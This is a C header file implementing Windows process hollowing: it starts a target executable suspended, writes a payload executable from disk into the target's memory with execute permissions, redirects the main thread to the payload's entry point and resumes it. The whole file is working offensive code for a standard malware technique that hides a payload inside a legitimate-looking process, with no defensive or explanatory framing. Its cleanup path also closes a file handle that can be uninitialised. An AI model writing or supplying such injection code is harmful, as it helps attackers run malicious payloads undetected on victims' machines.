#ifndef HOLLOW_H
#define HOLLOW_H

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

// Helper macro to print errors
#define PRINT_WINAPI_ERR(cApiName) printf("[!] %s Failed With Error: %d\n", cApiName, GetLastError())

static BOOL CreateHollowProcess(LPCSTR targetProcessPath, LPCSTR payloadPath) {
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    PVOID remoteImage = NULL;
    PBYTE localImage = NULL;
    PIMAGE_DOS_HEADER pDosHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    SIZE_T bytesReadOrWritten;
    DWORD oldProtect = 0;  // This will store the old protection flags

    // Step 1: Create the target process in a suspended state
    if (!CreateProcessA(targetProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        PRINT_WINAPI_ERR("CreateProcessA");
        return FALSE;
    }

    // Step 2: Read the payload from disk
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PRINT_WINAPI_ERR("CreateFileA");
        goto CLEANUP;
    }

    DWORD payloadSize = GetFileSize(hFile, NULL);
    localImage = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
    if (!localImage) {
        PRINT_WINAPI_ERR("HeapAlloc");
        goto CLEANUP;
    }

    if (!ReadFile(hFile, localImage, payloadSize, &bytesReadOrWritten, NULL)) {
        PRINT_WINAPI_ERR("ReadFile");
        goto CLEANUP;
    }
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    // Step 3: Parse the headers of the payload
    pDosHeader = (PIMAGE_DOS_HEADER)localImage;
    pNtHeaders = (PIMAGE_NT_HEADERS)(localImage + pDosHeader->e_lfanew);

    // Step 4: Allocate memory in the target process for the payload
    remoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) {
        PRINT_WINAPI_ERR("VirtualAllocEx");
        goto CLEANUP;
    }

    // Step 5: Write the payload's headers to the target process
    if (!WriteProcessMemory(pi.hProcess, remoteImage, localImage, pNtHeaders->OptionalHeader.SizeOfHeaders, &bytesReadOrWritten)) {
        PRINT_WINAPI_ERR("WriteProcessMemory (Headers)");
        goto CLEANUP;
    }

    // Step 6: Write the payload's sections to the target process
    pSectionHeader = (PIMAGE_SECTION_HEADER)(localImage + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData > 0) {
            // Before writing, change the protection if needed
            if (!VirtualProtectEx(pi.hProcess, (LPVOID)((DWORD_PTR)remoteImage + pSectionHeader[i].VirtualAddress),
                                  pSectionHeader[i].SizeOfRawData, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                PRINT_WINAPI_ERR("VirtualProtectEx (Sections)");
                goto CLEANUP;
            }

            if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)remoteImage + pSectionHeader[i].VirtualAddress),
                                    localImage + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData, &bytesReadOrWritten)) {
                PRINT_WINAPI_ERR("WriteProcessMemory (Sections)");
                goto CLEANUP;
            }

            // Restore the original protection
            if (!VirtualProtectEx(pi.hProcess, (LPVOID)((DWORD_PTR)remoteImage + pSectionHeader[i].VirtualAddress),
                                  pSectionHeader[i].SizeOfRawData, oldProtect, &oldProtect)) {
                PRINT_WINAPI_ERR("VirtualProtectEx (Restore)");
                goto CLEANUP;
            }
        }
    }

    // Step 7: Set the context of the main thread to the entry point of the payload
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        PRINT_WINAPI_ERR("GetThreadContext");
        goto CLEANUP;
    }

    ctx.Rcx = (DWORD_PTR)remoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        PRINT_WINAPI_ERR("SetThreadContext");
        goto CLEANUP;
    }

    // Step 8: Resume the suspended process
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        PRINT_WINAPI_ERR("ResumeThread");
        goto CLEANUP;
    }

    // Clean up and return success
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    HeapFree(GetProcessHeap(), 0, localImage);

    return TRUE;

CLEANUP:
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (localImage) HeapFree(GetProcessHeap(), 0, localImage);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    return FALSE;
}

#endif
